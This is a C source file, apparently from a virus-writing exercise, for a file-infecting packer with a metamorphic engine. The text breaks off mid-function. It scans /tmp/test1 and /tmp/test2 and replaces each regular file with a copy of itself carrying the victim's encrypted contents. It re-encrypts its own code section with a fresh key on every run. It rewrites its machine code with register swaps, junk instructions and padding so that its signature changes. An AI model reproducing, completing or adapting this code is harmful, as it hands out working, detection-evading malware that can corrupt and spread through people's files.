#define _GNU_SOURCE
#include <stdint.h>
#include <stddef.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <dirent.h>
#include <sys/stat.h>
#include <sys/mman.h>

#include "cipher.h"
#include "elfstate.h"
#include "pack.h"

#define PATH_CAP 4096

/*
 * Functions tagged ENC live in the "enc" section: ciphertext on disk,
 * decrypted in memory before use and re-encrypted (fresh key) each run.
 * The linker bounds it with __start_enc/__stop_enc.
 */
#define ENC __attribute__((section("enc")))

extern char __start_enc[];
extern char __stop_enc[];

__asm__(
	".pushsection enc,\"ax\",@progbits\n"
	".balign 256\n"
	".globl morph_start\n"
	"morph_start:\n"
	"	ret\n"
	"	.fill 95, 1, 0x90\n"
	".globl morph_end\n"
	"morph_end:\n"
	".popsection\n"
);

extern char morph_start[];
extern char morph_end[];

typedef uint64_t (*hashfn)(const uint8_t *, size_t);
static hashfn g_hash = pack_hash;

static volatile struct self_key {
	uint8_t		key[SPECK_KEY_SIZE];
	uint8_t		nonce[SPECK_BLOCK_SIZE];
	uint8_t		sealed;
	uint8_t		_nz;
} selfk = { { 0 }, { 0 }, 0, 0xA5 };

ENC static void
render_flag(struct pack_trailer *tr)
{
	char base[] = "cde-sede was here :: ";
	char d[20];
	size_t i = 0;
	size_t j;
	int nd = 0;
	uint64_t n = tr->counter;

	for (j = 0; j + 1 < sizeof(base) && i < PACK_FLAG_CAP - 1; ++j)
		tr->flag[i++] = base[j];

	do {
		d[nd++] = (char)('0' + n % 10);
		n /= 10;
	} while (n != 0);

	while (nd > 0 && i < PACK_FLAG_CAP - 1)
		tr->flag[i++] = d[--nd];

	tr->flag[i] = '\0';
}

static int
read_at(int fd, void *buf, size_t size, off_t offset)
{
	uint8_t *p = buf;

	while (size > 0) {
		ssize_t n = pread(fd, p, size, offset);

		if (n < 0 && errno == EINTR)
			continue;
		if (n <= 0)
			return -1;

		p += n;
		size -= (size_t)n;
		offset += n;
	}

	return 0;
}

static int
write_all(int fd, const void *buf, size_t size)
{
	const uint8_t *p = buf;

	while (size > 0) {
		ssize_t n = write(fd, p, size);

		if (n < 0 && errno == EINTR)
			continue;
		if (n <= 0)
			return -1;

		p += n;
		size -= (size_t)n;
	}

	return 0;
}

static int
ctr_crypt(uint8_t *buf, size_t size, const uint8_t *key, const uint8_t *nonce)
{
	block_cipher_t c;

	if (cipher_init(&c, CIPHER_SPECK, (const cipher_params_t *)0) < 0)
		return -1;
	if (c.setup(&c, key) < 0)
		return -1;

	ctr_stream(&c, nonce, buf, buf, size);
	return 0;
}

static int
open_self(struct stat *st)
{
	int fd = open("/proc/self/exe", O_RDONLY | O_CLOEXEC);

	if (fd < 0)
		return -1;

	if (fstat(fd, st) < 0) {
		close(fd);
		return -1;
	}

	return fd;
}

static int
payload_to_memfd(const struct stat *st, const struct pack_trailer *tr,
	uint8_t **payload_out, uint64_t *off_out)
{
	uint8_t key[SPECK_KEY_SIZE];
	uint64_t payload_off;
	uint8_t *payload;
	int self;
	int mfd;

	if (tr->payload_size == 0 ||
		tr->payload_size + sizeof(*tr) > (uint64_t)st->st_size)
		return -14;

	payload_off = (uint64_t)st->st_size - sizeof(*tr) - tr->payload_size;

	payload = malloc(tr->payload_size);
	if (payload == NULL)
		return -15;

	self = open("/proc/self/exe", O_RDONLY | O_CLOEXEC);
	if (self < 0) {
		free(payload);
		return -10;
	}
	if (read_at(self, payload, tr->payload_size, (off_t)payload_off) < 0) {
		close(self);
		free(payload);
		return -16;
	}
	close(self);

	pack_mix(NULL, tr->seed, key);
	if (ctr_crypt(payload, tr->payload_size, key, tr->nonce) < 0 ||
		g_hash(payload, tr->payload_size) != tr->plain_hash) {
		free(payload);
		return -42;
	}

	mfd = memfd_create("x", 0);
	if (mfd < 0 || write_all(mfd, payload, tr->payload_size) < 0) {
		free(payload);
		return -19;
	}

	*payload_out = payload;
	*off_out = payload_off;
	return mfd;
}

static uint8_t *
stage_payload(struct es_image *w, const struct stat *st,
	struct pack_trailer *tr, const uint8_t *plain, uint64_t payload_off)
{
	uint8_t key[SPECK_KEY_SIZE];
	uint8_t *cipher;
	struct es_region *r;

	cipher = malloc(tr->payload_size);
	if (cipher == NULL)
		return NULL;
	memcpy(cipher, plain, tr->payload_size);

	if (random_bytes(tr->seed, sizeof(tr->seed)) != 0 ||
		random_bytes(tr->nonce, sizeof(tr->nonce)) != 0) {
		free(cipher);
		return NULL;
	}
	pack_mix(NULL, tr->seed, key);
	if (ctr_crypt(cipher, tr->payload_size, key, tr->nonce) < 0) {
		free(cipher);
		return NULL;
	}

	++tr->counter;
	render_flag(tr);

	if (es_register_file(w, (Elf64_Off)payload_off, tr->payload_size,
			&r) < 0 || es_region_stage(r, cipher) < 0 ||
		es_register_file(w,
			(Elf64_Off)((uint64_t)st->st_size - sizeof(*tr)),
			sizeof(*tr), &r) < 0 || es_region_stage(r, tr) < 0) {
		free(cipher);
		return NULL;
	}

	return cipher;
}

static int
is_packed(const char *path)
{
	struct stat s;
	struct pack_trailer tr;
	int fd = open(path, O_RDONLY | O_CLOEXEC);
	int packed = 0;

	if (fd < 0)
		return 0;

	if (fstat(fd, &s) == 0 && (uint64_t)s.st_size >= sizeof(tr) &&
		read_at(fd, &tr, sizeof(tr),
			(off_t)((uint64_t)s.st_size - sizeof(tr))) == 0 &&
		tr.magic == PACK_MAGIC)
		packed = 1;

	close(fd);
	return packed;
}

ENC static int
pack_target(const struct stat *self_st, const char *target, const char *out)
{
	struct stat tst;
	struct pack_trailer tr;
	struct es_image img;
	struct es_region *rp;
	struct es_region *rt;
	uint8_t key[SPECK_KEY_SIZE];
	uint8_t *payload;
	uint64_t self_size = (uint64_t)self_st->st_size;
	int fd;

	fd = open(target, O_RDONLY | O_CLOEXEC);
	if (fd < 0)
		return 2;

	if (fstat(fd, &tst) < 0 || tst.st_size <= 0) {
		close(fd);
		return 2;
	}

	payload = mmap(NULL, (size_t)tst.st_size, PROT_READ | PROT_WRITE,
		MAP_PRIVATE, fd, 0);
	close(fd);
	if (payload == MAP_FAILED)
		return 3;

	tr.payload_size = (uint64_t)tst.st_size;
	tr.plain_hash = g_hash(payload, tr.payload_size);
	tr.counter = 0;
	tr.magic = PACK_MAGIC;
	render_flag(&tr);

	if (random_bytes(tr.nonce, sizeof(tr.nonce)) != 0 ||
		random_bytes(tr.seed, sizeof(tr.seed)) != 0) {
		munmap(payload, (size_t)tst.st_size);
		return 4;
	}

	pack_mix(NULL, tr.seed, key);

	if (ctr_crypt(payload, tr.payload_size, key, tr.nonce) < 0) {
		munmap(payload, (size_t)tst.st_size);
		return 5;
	}

	if (es_open(&img) < 0 ||
		es_register_file(&img, (Elf64_Off)self_size,
			tr.payload_size, &rp) < 0 ||
		es_region_stage(rp, payload) < 0 ||
		es_register_file(&img, (Elf64_Off)(self_size + tr.payload_size),
			sizeof(tr), &rt) < 0 ||
		es_region_stage(rt, &tr) < 0) {
		munmap(payload, (size_t)tst.st_size);
		return 6;
	}

	if (es_build_to(&img, NULL, out) < 0) {
		munmap(payload, (size_t)tst.st_size);
		return 7;
	}

	munmap(payload, (size_t)tst.st_size);
	return 0;
}

#define MAX_ENTRIES 4096

ENC static int
pack_folder(const struct stat *self_st)
{
	char inbuf[PATH_CAP];
	char *names[MAX_ENTRIES];
	char *target_folders[] = {"/tmp/test1", "/tmp/test2"};
	size_t names_count;
	size_t i;
	size_t j;
	DIR *dir;
	struct dirent *e;
	int rc = 0;

	for (j = 0; j < sizeof(target_folders) / sizeof(target_folders[0]); ++j) {
		names_count = 0;
		dir = opendir(target_folders[j]);
		if (dir == NULL) {
#ifdef DEBUG
			fprintf(stderr, "famine: cannot open %s\n", target_folders[j]);
#endif
			rc = 1;
			continue;
		}

		while ((e = readdir(dir)) != NULL && names_count < MAX_ENTRIES) {
			if (e->d_name[0] == '.')
				continue;
			names[names_count] = strdup(e->d_name);
			if (names[names_count] != NULL)
				++names_count;
		}
		closedir(dir);

		for (i = 0; i < names_count; ++i) {
			struct stat es;

			if (snprintf(inbuf, sizeof(inbuf), "%s/%s",
				target_folders[j], names[i]) < (int)sizeof(inbuf) &&
				stat(inbuf, &es) == 0 && S_ISREG(es.st_mode) &&
				!is_packed(inbuf)) {
				if (pack_target(self_st, inbuf, inbuf) != 0)
					rc = 1;
			}

			free(names[i]);
		}
	}

	return rc;
}

static int
enc_mprotect(int prot)
{
	uintptr_t pg = (uintptr_t)__start_enc & ~(uintptr_t)0xfff;
	size_t len = (((uintptr_t)__stop_enc - pg) + 0xfff) & ~(size_t)0xfff;

	return mprotect((void *)pg, len, prot);
}

static void
enc_unseal_mem(void)
{
	size_t n = (size_t)(__stop_enc - __start_enc);

	enc_mprotect(PROT_READ | PROT_WRITE);
	ctr_crypt((uint8_t *)__start_enc, n, (uint8_t *)selfk.key,
		(uint8_t *)selfk.nonce);
	enc_mprotect(PROT_READ | PROT_EXEC);
}

static uint8_t *
stage_seal(struct es_image *w, const struct es_image *img, struct self_key *nk)
{
	size_t n = (size_t)(__stop_enc - __start_enc);
	struct es_region *r;
	Elf64_Off enc_off;
	Elf64_Off key_off;
	uint8_t *cipher;

	if (es_runtime_to_file(img, (uintptr_t)__start_enc, n, &enc_off) < 0 ||
		es_runtime_to_file(img, (uintptr_t)&selfk, sizeof(selfk),
			&key_off) < 0)
		return NULL;

	cipher = malloc(n);
	if (cipher == NULL)
		return NULL;
	memcpy(cipher, __start_enc, n);

	nk->_nz = 0xA5;
	nk->sealed = 1;
	if (random_bytes(nk->key, sizeof(nk->key)) != 0 ||
		random_bytes(nk->nonce, sizeof(nk->nonce)) != 0 ||
		ctr_crypt(cipher, n, nk->key, nk->nonce) < 0) {
		free(cipher);
		return NULL;
	}

	if (es_register_file(w, enc_off, n, &r) < 0 ||
		es_region_stage(r, cipher) < 0 ||
		es_register_file(w, key_off, sizeof(*nk), &r) < 0 ||
		es_region_stage(r, nk) < 0) {
		free(cipher);
		return NULL;
	}

	return cipher;
}

/* ---- metamorphic engine (plaintext: it rewrites the enc block) ---- */
#define FNV_OFFSET 0xcbf29ce484222325ull
#define FNV_PRIME  0x100000001b3ull

#define REG_RDI 7	/* data pointer (arg 0) */
#define REG_RSI 6	/* length / loop counter (arg 1) */
#define REG_RAX 0	/* result */

static const uint8_t REG_POOL[] = { 0, 1, 2, 8, 9, 10, 11 }; /* no sp/bp/rsi/rdi */

struct emit {
	uint8_t *base;
	uint8_t *p;
	uint8_t *end;
};

static void
e8(struct emit *e, uint8_t b)
{
	if (e->p < e->end)
		*e->p++ = b;
}

static size_t
off(const struct emit *e)
{
	return (size_t)(e->p - e->base);
}

static void
rexw(struct emit *e, int reg, int rm)		/* REX.W (+R/+B for r8..r15) */
{
	e8(e, (uint8_t)(0x48 | ((reg >= 8) << 2) | (rm >= 8)));
}

static void
modrm(struct emit *e, int mod, int reg, int rm)
{
	e8(e, (uint8_t)((mod << 6) | ((reg & 7) << 3) | (rm & 7)));
}

static void
mov_rr(struct emit *e, int dst, int src)	/* 89 /r */
{
	rexw(e, src, dst);
	e8(e, 0x89);
	modrm(e, 3, src, dst);
}

static void
add_rr(struct emit *e, int dst, int src)	/* 01 /r */
{
	rexw(e, src, dst);
	e8(e, 0x01);
	modrm(e, 3, src, dst);
}

static void
xor_rr(struct emit *e, int dst, int src)	/* 31 /r */
{
	rexw(e, src, dst);
	e8(e, 0x31);
	modrm(e, 3, src, dst);
}

static void
imul_rr(struct emit *e, int dst, int src)	/* 0f af /r: reg = dst, r/m = src */
{
	rexw(e, dst, src);
	e8(e, 0x0f);
	e8(e, 0xaf);
	modrm(e, 3, dst, src);
}

static void
test_rr(struct emit *e, int a, int b)		/* 85 /r */
{
	rexw(e, b, a);
	e8(e, 0x85);
	modrm(e, 3, b, a);
}

static void
inc_r(struct emit *e, int r)			/* ff /0 */
{
	e8(e, (uint8_t)(0x48 | (r >= 8)));
	e8(e, 0xff);
	modrm(e, 3, 0, r);
}

static void
dec_r(struct emit *e, int r)			/* ff /1 */
{
	e8(e, (uint8_t)(0x48 | (r >= 8)));
	e8(e, 0xff);
	modrm(e, 3, 1, r);
}

/* movzbq dst, byte [base]; base must not be rsp/rbp/r12/r13 (rdi is fine). */
static void
movzx_b(struct emit *e, int dst, int base)
{
	e8(e, (uint8_t)(0x48 | ((dst >= 8) << 2) | (base >= 8)));
	e8(e, 0x0f);
	e8(e, 0xb6);
	modrm(e, 0, dst, base);
}

static void
movabs(struct emit *e, int dst, uint64_t v)	/* b8+r io */
{
	int i;

	e8(e, (uint8_t)(0x48 | (dst >= 8)));
	e8(e, (uint8_t)(0xb8 + (dst & 7)));
	for (i = 0; i < 8; ++i)
		e8(e, (uint8_t)(v >> (8 * i)));
}

static void
add_imm8(struct emit *e, int r, int8_t imm)	/* 83 /0 ib */
{
	e8(e, (uint8_t)(0x48 | (r >= 8)));
	e8(e, 0x83);
	modrm(e, 3, 0, r);
	e8(e, (uint8_t)imm);
}

static void
sub_imm8(struct emit *e, int r, int8_t imm)	/* 83 /5 ib */
{
	e8(e, (uint8_t)(0x48 | (r >= 8)));
	e8(e, 0x83);
	modrm(e, 3, 5, r);
	e8(e, (uint8_t)imm);
}

static void
lea_inc(struct emit *e, int r)			/* lea r, [r+1] */
{
	e8(e, (uint8_t)(0x48 | ((r >= 8) << 2) | (r >= 8)));
	e8(e, 0x8d);
	modrm(e, 1, r, r);
	e8(e, 0x01);
}

static uint8_t
rnd(void)
{
	uint8_t b;

	random_bytes(&b, 1);
	return b;
}

/* ptr += 1, lowered three different ways. */
static void
lower_incptr(struct emit *e, int r)
{
	switch (rnd() % 3) {
	case 0: inc_r(e, r); break;
	case 1: add_imm8(e, r, 1); break;
	default: lea_inc(e, r); break;
	}
}

/* count -= 1 (sets ZF for the loop branch), two ways. */
static void
lower_dec(struct emit *e, int r)
{
	if (rnd() & 1)
		dec_r(e, r);
	else
		sub_imm8(e, r, 1);
}

static void
emit_junk(struct emit *e, int junk)
{
	uint64_t v;

	random_bytes((uint8_t *)&v, sizeof(v));

	switch (rnd() % 3) {
	case 0: movabs(e, junk, v); break;
	case 1: xor_rr(e, junk, junk); break;
	default: add_rr(e, junk, junk); break;
	}
}

static void
morph_build(uint8_t *buf, size_t cap)
{
	struct emit e = { buf, buf, buf + cap };
	uint8_t r[4];
	int acc, b, tc, junk;
	int hoist;
	size_t loop_at;
	size_t jz_fix;
	long disp;

	random_bytes(r, sizeof(r));
	acc = REG_POOL[r[0] % sizeof(REG_POOL)];
	do { b = REG_POOL[r[1]++ % sizeof(REG_POOL)]; } while (b == acc);
	do { tc = REG_POOL[r[2]++ % sizeof(REG_POOL)]; } while (tc == acc || tc == b);
	do { junk = REG_POOL[r[3]++ % sizeof(REG_POOL)]; }
	while (junk == acc || junk == b || junk == tc);

	hoist = rnd() & 1;

	movabs(&e, acc, FNV_OFFSET);
	if (hoist)
		movabs(&e, tc, FNV_PRIME);

	test_rr(&e, REG_RSI, REG_RSI);
	e8(&e, 0x0f);				/* jz done, rel32 (patched) */
	e8(&e, 0x84);
	jz_fix = off(&e);
	e8(&e, 0); e8(&e, 0); e8(&e, 0); e8(&e, 0);

	loop_at = off(&e);
	movzx_b(&e, b, REG_RDI);	/* b = *data */
	xor_rr(&e, acc, b);			/* acc ^= b */
	if (!hoist)
		movabs(&e, tc, FNV_PRIME);
	imul_rr(&e, acc, tc);		/* acc *= prime */

	if (rnd() & 1) {
		lower_incptr(&e, REG_RDI);
		emit_junk(&e, junk);
	} else {
		emit_junk(&e, junk);
		lower_incptr(&e, REG_RDI);
	}
	lower_dec(&e, REG_RSI);		/* --len, sets ZF */

	disp = (long)loop_at - (long)(off(&e) + 2);
	if (disp >= -128 && disp <= 127) {
		e8(&e, 0x75);			/* jnz loop, rel8 */
		e8(&e, (uint8_t)(int8_t)disp);
	} else {
		disp = (long)loop_at - (long)(off(&e) + 6);
		e8(&e, 0x0f);			/* jnz loop, rel32 */
		e8(&e, 0x85);
		e8(&e, (uint8_t)disp); e8(&e, (uint8_t)(disp >> 8));
		e8(&e, (uint8_t)(disp >> 16)); e8(&e, (uint8_t)(disp >> 24));
	}

	disp = (long)off(&e) - (long)(jz_fix + 4);
	buf[jz_fix] = (uint8_t)disp;
	buf[jz_fix + 1] = (uint8_t)(disp >> 8);
	buf[jz_fix + 2] = (uint8_t)(disp >> 16);
	buf[jz_fix + 3] = (uint8_t)(disp >> 24);

	if (acc != REG_RAX)
		mov_rr(&e, REG_RAX, acc);
	e8(&e, 0xc3);				/* ret */

	while (e.p < e.end)
		*e.p++ = 0x90;
}

static size_t
insn_decode(const uint8_t *p, size_t max, int *rex_off, int *op_off,
	int *modrm_off)
{
	size_t i = 0;
	uint8_t op;
	int opsize = 0;		/* 0x66 present */
	int rexw = 0;
	int has_modrm = 0;
	int grp3 = 0;		/* f6/f7: immediate only for /0 and /1 */
	int iz;
	int imm = 0;

	*rex_off = -1;
	*op_off = -1;
	*modrm_off = -1;

	for (;;) {			/* legacy prefixes */
		if (i >= max)
			return 0;
		if (p[i] == 0x66) { opsize = 1; ++i; }
		else if (p[i] == 0x67 || p[i] == 0xf0 || p[i] == 0xf2 ||
			p[i] == 0xf3 || p[i] == 0x2e || p[i] == 0x36 ||
			p[i] == 0x3e || p[i] == 0x26 || p[i] == 0x64 ||
			p[i] == 0x65) { ++i; }
		else break;
	}

	if ((p[i] & 0xf0) == 0x40) {	/* REX */
		*rex_off = (int)i;
		rexw = (p[i] & 8) != 0;
		if (++i >= max)
			return 0;
	}

	iz = opsize ? 2 : 4;			/* size of a word-sized immediate */
	op = p[i];
	*op_off = (int)i;
	if (++i > max)
		return 0;

	if (op == 0x0f) {
		uint8_t o2;

		if (i >= max)
			return 0;
		o2 = p[i++];
		if (o2 >= 0x80 && o2 <= 0x8f)
			imm = 4;						/* jcc rel32 */
		else if (o2 == 0xaf || o2 == 0x1e || o2 == 0x1f ||
			(o2 >= 0x40 && o2 <= 0x4f) ||	/* cmovcc */
			(o2 >= 0x90 && o2 <= 0x9f) ||	/* setcc */
			(o2 >= 0xb6 && o2 <= 0xbf) ||	/* movzx/movsx, bsf/bsr */
			o2 == 0xb0 || o2 == 0xb1)		/* cmpxchg */
			has_modrm = 1;
		else
			return 0;
	} else switch (op) {
	/* ALU Eb,Gb / Ev,Gv / Gb,Eb / Gv,Ev */
	case 0x00: case 0x01: case 0x02: case 0x03:
	case 0x08: case 0x09: case 0x0a: case 0x0b:
	case 0x10: case 0x11: case 0x12: case 0x13:
	case 0x18: case 0x19: case 0x1a: case 0x1b:
	case 0x20: case 0x21: case 0x22: case 0x23:
	case 0x28: case 0x29: case 0x2a: case 0x2b:
	case 0x30: case 0x31: case 0x32: case 0x33:
	case 0x38: case 0x39: case 0x3a: case 0x3b:
	case 0x84: case 0x85: case 0x86: case 0x87:				/* test/xchg */
	case 0x88: case 0x89: case 0x8a: case 0x8b:
	case 0x8d: case 0x8f: case 0x63:						/* lea, pop Ev, movsxd */
		has_modrm = 1; break;
	case 0x04: case 0x0c: case 0x14: case 0x1c:
	case 0x24: case 0x2c: case 0x34: case 0x3c:
	case 0xa8:												/* ALU AL,Ib / test */
		imm = 1; break;
	case 0x05: case 0x0d: case 0x15: case 0x1d:
	case 0x25: case 0x2d: case 0x35: case 0x3d:
	case 0xa9:												/* ALU rAX,Iz / test */
		imm = iz; break;
	case 0x50: case 0x51: case 0x52: case 0x53:				/* push */
	case 0x54: case 0x55: case 0x56: case 0x57:
	case 0x58: case 0x59: case 0x5a: case 0x5b:				/* pop */
	case 0x5c: case 0x5d: case 0x5e: case 0x5f:
	case 0x90: case 0x98: case 0x99:						/* nop, cltq, cqo */
	case 0xc3: case 0xc9: case 0xf4:						/* ret, leave, hlt */
		break;
	case 0x68: imm = 4; break;								/* push imm32 */
	case 0x6a: imm = 1; break;								/* push imm8 */
	case 0x69: has_modrm = 1; imm = iz; break;				/* imul Gv,Ev,Iz */
	case 0x6b: has_modrm = 1; imm = 1; break;				/* imul Gv,Ev,Ib */
	case 0x70: case 0x71: case 0x72: case 0x73:				/* jcc rel8 */
	case 0x74: case 0x75: case 0x76: case 0x77:
	case 0x78: case 0x79: case 0x7a: case 0x7b:
	case 0x7c: case 0x7d: case 0x7e: case 0x7f:
	case 0xeb:												/* jmp rel8 */
		imm = 1; break;
	case 0x80: has_modrm = 1; imm = 1; break;				/* grp1 Eb,Ib */
	case 0x81: has_modrm = 1; imm = iz; break;				/* grp1 Ev,Iz */
	case 0x83: has_modrm = 1; imm = 1; break;				/* grp1 Ev,Ib */
	case 0xc0: case 0xc1: has_modrm = 1; imm = 1; break;	/* shift Ib */
	case 0xc6: has_modrm = 1; imm = 1; break;				/* mov Eb,Ib */
	case 0xc7: has_modrm = 1; imm = iz; break;				/* mov Ev,Iz */
	case 0xc2: imm = 2; break;								/* ret imm16 */
	case 0xd0: case 0xd1: case 0xd2: case 0xd3:				/* shift 1/CL */
	case 0xfe: case 0xff:									/* inc/dec, grp5 */
		has_modrm = 1; break;
	case 0xf6: has_modrm = 1; grp3 = 1; break;				/* grp3 Eb */
	case 0xf7: has_modrm = 1; grp3 = 2; break;				/* grp3 Ev */
	case 0xb0: case 0xb1: case 0xb2: case 0xb3:				/* mov r8,Ib */
	case 0xb4: case 0xb5: case 0xb6: case 0xb7:
		imm = 1; break;
	case 0xb8: case 0xb9: case 0xba: case 0xbb:				/* mov rv,Iv (movabs) */
	case 0xbc: case 0xbd: case 0xbe: case 0xbf:
		imm = rexw ? 8 : iz; break;
	case 0xe8: case 0xe9: imm = 4; break;					/* call/jmp rel32 */
	default:
		return 0;
	}

	if (has_modrm) {
		uint8_t m;
		int mod, rm, reg;

		if (i >= max)
			return 0;
		m = p[i];
		*modrm_off = (int)i;
		if (++i > max)
			return 0;

		mod = m >> 6;
		rm = m & 7;
		reg = (m >> 3) & 7;
		if (mod != 3) {
			int sib5 = 0;

			if (rm == 4) {		/* SIB */
				if (i >= max)
					return 0;
				if ((p[i++] & 7) == 5)
					sib5 = 1;
			}
			if (mod == 0)
				i += (rm == 5 || sib5) ? 4 : 0;
			else if (mod == 1)
				i += 1;
			else
				i += 4;
		}
		if (grp3 && reg < 2)		/* test Eb,Ib / Ev,Iz */
			imm = grp3 == 1 ? 1 : iz;
	}

	i += (size_t)imm;
	return i <= max ? i : 0;
}

/*
 * Metamorphic pass over already-emitted machine code
 */
static void
morph_substitute(uint8_t *buf, size_t len)
{
	size_t i = 0;

	while (i < len) {
		int rexo, opo, mo;
		size_t l = insn_decode(buf + i, len - i, &rexo, &opo, &mo);
		uint8_t *op;
		uint8_t m;

		if (l == 0)
			return;

		if (mo >= 0 && (m = buf[i + mo], (m >> 6) == 3) && (rnd() & 1)) {
			op = buf + i + opo;
			if (*op == 0x89 || *op == 0x8b) {
				int reg = (m >> 3) & 7, rm = m & 7;

				*op ^= 0x02;
				buf[i + mo] = (uint8_t)(0xc0 | (rm << 3) | reg);
				if (rexo >= 0) {
					uint8_t x = buf[i + rexo];
					uint8_t R = (x >> 2) & 1, B = x & 1;

					buf[i + rexo] = (uint8_t)((x & ~0x05) |
						(B << 2) | R);
				}
			} else if (*op == 0x31 || *op == 0x29) {
				int x = rexo >= 0 ? buf[i + rexo] : 0;
				int reg = (((x >> 2) & 1) << 3) | ((m >> 3) & 7);
				int rm = ((x & 1) << 3) | (m & 7);

				if (reg == rm)		/* true r := 0 */
					*op ^= 0x18;
			}
		}

		i += l;
	}
}

/*
 * Length-changing transform
 */
#define MG_MAX 512

static int
mg_index_of(const size_t *off, int n, size_t target)
{
	int k;

	for (k = 0; k < n; ++k)
		if (off[k] == target)
			return k;
	return -1;
}

static int
insn_nopish(const uint8_t *p, size_t max)
{
	int a, oo, m;
	size_t l = insn_decode(p, max, &a, &oo, &m);
	uint8_t op;
	int rex, R, B;

	if (l == 0)
		return 0;
	op = p[oo];
	if (op == 0x90)
		return 1;
	if (op == 0x0f && p[oo + 1] == 0x1f)
		return 1;
	if (m < 0)
		return 0;

	rex = (a >= 0) ? p[a] : 0;
	R = (rex >> 2) & 1;
	B = rex & 1;

	if ((op == 0x89 || op == 0x8b) && (p[m] >> 6) == 3)
		return (R * 8 + ((p[m] >> 3) & 7)) == (B * 8 + (p[m] & 7));

	if (op == 0x8d) {
		int mod = p[m] >> 6, rmf = p[m] & 7;

		if ((mod == 1 || mod == 2) && rmf != 4 &&
			(R * 8 + ((p[m] >> 3) & 7)) == (B * 8 + rmf)) {
			if (mod == 1)
				return p[m + 1] == 0;
			return p[m + 1] == 0 && p[m + 2] == 0 &&
				p[m + 3] == 0 && p[m + 4] == 0;
		}
	}
	return 0;
}

static void
emit_fill(struct emit *e, size_t w)
{
	while (w > 0) {
		int g = (int)(rnd() & 15);

		if ((g & 7) == 4)			/* avoid rsp/r12 base in lea */
			g ^= 1;
		if (w >= 7) {				/* lea g,[g+0] disp32 */
			e8(e, (uint8_t)(0x48 | ((g >= 8) ? 0x5 : 0)));
			e8(e, 0x8d);
			e8(e, (uint8_t)(0x80 | ((g & 7) << 3) | (g & 7)));
			e8(e, 0); e8(e, 0); e8(e, 0); e8(e, 0);
			w -= 7;
		} else if (w >= 4) {		/* lea g,[g+0] disp8 */
			e8(e, (uint8_t)(0x48 | ((g >= 8) ? 0x5 : 0)));
			e8(e, 0x8d);
			e8(e, (uint8_t)(0x40 | ((g & 7) << 3) | (g & 7)));
			e8(e, 0);
			w -= 4;
		} else if (w == 3) {		/* mov g,g */
			mov_rr(e, g, g);
			w -= 3;
		} else if (w == 2) {		/* nopw */
			e8(e, 0x66); e8(e, 0x90);
			w -= 2;
		} else {					/* nop */
			e8(e, 0x90);
			w -= 1;
		}
	}
}

/*
 * bkind: 0 none, 1 internal rel8 (promotable), 2 internal rel32,
 * 3 external rel32 (call/tail-jmp: target fixed, re-based by shift rule),
 * 4 RIP-relative disp32 (data ref: target fixed, re-based by shift rule).
 * Returns 1 if it rewrote buf, 0 if it left it unchanged (bailed).
 */
static int
morph_grow(uint8_t *buf, size_t cap)
{
	struct ins {
		size_t off, new_off, tgt;
		long old_disp;
		int len, new_len, dpos, dsz, bkind, cc, isjmp, ti;
	} I[MG_MAX];
	size_t off[MG_MAX];
	int ins[MG_MAX + 1];
	uint8_t tmp[2048];
	size_t cl = 0, p, total;
	int n = 0, k, a, oo, m, changed;

	if (cap > sizeof(tmp))
		return 0;

	{
		size_t pos = 0, last_end = 0;

		while (pos < cap) {
			size_t l = insn_decode(buf + pos, cap - pos, &a, &oo, &m);

			if (l == 0)
				return 0;
			if (!insn_nopish(buf + pos, cap - pos))
				last_end = pos + l;
			pos += l;
		}
		if (pos != cap)
			return 0;
		cl = last_end;
	}
	if (cl == 0)
		return 0;

	for (p = 0; p < cl; ) {
		size_t l = insn_decode(buf + p, cl - p, &a, &oo, &m);
		uint8_t op;

		if (l == 0 || n >= MG_MAX)
			return 0;
		op = buf[p + oo];
		I[n].off = p;
		I[n].len = (int)l;
		I[n].new_len = (int)l;
		I[n].bkind = 0;
		I[n].isjmp = 0;
		I[n].dpos = 0;
		I[n].dsz = 0;
		I[n].old_disp = 0;
		if (op >= 0x70 && op <= 0x7f) {
			I[n].bkind = 1; I[n].dpos = oo + 1; I[n].dsz = 1;
			I[n].cc = op & 0xf;
		} else if (op == 0xeb) {
			I[n].bkind = 1; I[n].dpos = oo + 1; I[n].dsz = 1;
			I[n].isjmp = 1;
		} else if (op == 0x0f) {
			uint8_t o2 = buf[p + oo + 1];

			if (o2 >= 0x80 && o2 <= 0x8f) {
				I[n].bkind = 2; I[n].dpos = oo + 2; I[n].dsz = 4;
				I[n].cc = o2 & 0xf;
			}
		} else if (op == 0xe9) {
			I[n].bkind = 2; I[n].dpos = oo + 1; I[n].dsz = 4;
			I[n].isjmp = 1;
		} else if (op == 0xe8) {
			I[n].bkind = 3; I[n].dpos = oo + 1; I[n].dsz = 4;
		} else if (m >= 0 && (buf[p + m] >> 6) == 0 &&
			(buf[p + m] & 7) == 5) {
			I[n].bkind = 4; I[n].dpos = m + 1; I[n].dsz = 4;
		}
		if (I[n].bkind) {
			long d;

			if (I[n].dsz == 1)
				d = (int8_t)buf[p + I[n].dpos];
			else
				d = (int32_t)((uint32_t)buf[p + I[n].dpos] |
					((uint32_t)buf[p + I[n].dpos + 1] << 8) |
					((uint32_t)buf[p + I[n].dpos + 2] << 16) |
					((uint32_t)buf[p + I[n].dpos + 3] << 24));
			I[n].old_disp = d;
			I[n].tgt = (size_t)((long)p + (long)l + d);
		}
		off[n] = p;
		p += l;
		++n;
	}

	for (k = 0; k < n; ++k) {
		if (I[k].bkind == 1) {
			I[k].ti = mg_index_of(off, n, I[k].tgt);
			if (I[k].ti < 0)
				return 0;
		} else if (I[k].bkind == 2) {
			I[k].ti = mg_index_of(off, n, I[k].tgt);
			if (I[k].ti < 0)
				I[k].bkind = 3;
		}
	}

	for (k = 0; k <= n; ++k)
		ins[k] = 0;
	total = 0;
	{
		long budget = (cap > cl) ? (long)(cap - cl) / 2 : 0;
		int guard = 0;

		while (budget >= 1 && guard < 8 * n + 16) {
			int g = 1 + (int)(rnd() % (unsigned)n);
			int w = (int)(rnd() % 4) + 1;

			++guard;
			if ((long)w > budget)
				w = (int)budget;
			ins[g] += w;
			budget -= w;
			total += (size_t)w;
		}
	}

	for (;;) {
		size_t pos = 0;

		changed = 0;
		for (k = 0; k < n; ++k) {
			pos += (size_t)ins[k];
			I[k].new_off = pos;
			pos += (size_t)I[k].new_len;
		}
		for (k = 0; k < n; ++k) {
			long nd;

			if (I[k].bkind != 1)
				continue;
			nd = (long)I[I[k].ti].new_off -
				(long)(I[k].new_off + I[k].new_len);
			if (nd < -128 || nd > 127) {
